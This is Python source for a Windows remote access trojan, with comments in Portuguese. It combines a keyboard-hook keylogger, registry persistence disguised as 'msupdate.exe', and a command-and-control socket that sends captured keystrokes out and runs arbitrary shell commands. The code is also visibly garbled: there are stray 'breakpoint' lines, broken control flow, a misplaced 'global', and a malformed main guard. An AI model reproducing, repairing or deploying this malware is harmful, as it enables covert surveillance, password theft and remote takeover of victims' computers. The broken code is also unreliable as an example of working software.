from time import sleep, strftime 
import subprocess, socket, os, threading, sys, ctypes, ctypes.wintypes, winreg, shutil 
from ctypes import windll, byref, c_short, c_uint, c_void_p, create_string_buffer, sizeof

#Configuração do C&C
IP, PORT = "192.168.56.101", 443 
LOG_FILE = os.path.join(os.getenv("APPDATA"), "svchost.log") # log das teclas BUF, LOCK = "", threading.Lock()

#Keylogger via RawInputHook (não precisa de janela em foco)
WH_KEYBOARD_LL = 13; 
WM_KEYDOWN = 0x0100; 
WM_SYSKEYDOWN = 0x0104 
kbd_buf = create_string_buffer(256)

def low_level_handler(nCode, wParam, lParam): 
    if wParam in (WM_KEYDOWN, WM_SYSKEYDOWN): 
        vk = lParam[0] & 0xFF 
        windll.user32.GetKeyState.restype = ctypes.c_short 
        shift = windll.user32.GetKeyState(0x10) & 0x8000 
        caps = windll.user32.GetKeyState(0x14) & 1 
        mapped = windll.user32.MapVirtualKeyA(vk, 2) 
        if 0 < mapped < 256:
            
            char = chr(ctypes.c_ubyte(mapped).value) 
        if mapped < 256: 
            breakpoint
    
        else: "" 
        if shift ^ caps and char.isalpha():
                char = char.upper() 
                with LOCK: BUF += char 
                if 32<= mapped <=126 :
                    breakpoint
                
                    
        else:
            ("\n" if vk==13 else "\t" if vk==9 else "")
        return windll.user32.CallNextHookEx(hook_id, nCode, wParam, lParam)

HOOKPROCTYPE = ctypes.WINFUNCTYPE(c_uint, c_uint, c_uint, c_void_p) 
hook_func = HOOKPROCTYPE(low_level_handler) 
hook_id = None

def start_keylogger(): global hook_id 
hook_id = windll.user32.SetWindowsHookExA(WH_KEYBOARD_LL, hook_func, windll.kernel32.GetModuleHandleA(None), 0) 
msg = ctypes.wintypes.MSG() 
while windll.user32.GetMessageA(byref(msg), 0, 0, 0) != 0: 
    pass

#Persistência via HKCU\Run + cópia para AppData
def persist(): 
    dst = os.path.join(os.getenv("APPDATA"), "msupdate.exe") 
    if not os.path.exists(dst): 
        shutil.copy2(sys.executable, dst) 
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) 
        winreg.SetValueEx(key, "msupdate", 0, winreg.REG_SZ, dst) 
        winreg.CloseKey(key)

#Encapsulamento remoto + comandos extras
def connect(ip, port): 
    try:
        s = socket.socket(); 
        s.connect((ip, port)); 
        return s 
    except: pass

def listen(s): 
    while True: 
        data = s.recv(1024).decode().strip() 
        if data == "/exit":
            break 
        if data == "/keys": 
            with LOCK: 
                with open(LOG_FILE, "ab") as f: f.write(BUF.encode()) 
                BUF="" 
                try: 
                    with open(LOG_FILE,"rb") as f: s.send(f.read()[-4096:]+b"\n") 
                except: s.send(b"log vazio\n") 
                continue 
            if data.startswith("cd "): 
                os.chdir(data[3:]); s.send(b"OK\n"); 
            continue 
            p = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
            out, err = p.communicate() 
            s.send(out + err + b"\n")

#Inicializa tudo
def main(): 
    persist() 
    threading.Thread(target=start_keylogger, daemon=1).start() 
    while True: 
        s = connect(IP, PORT) 
        if s: listen(s) 
        sleep(0.5)

if name == "main": main()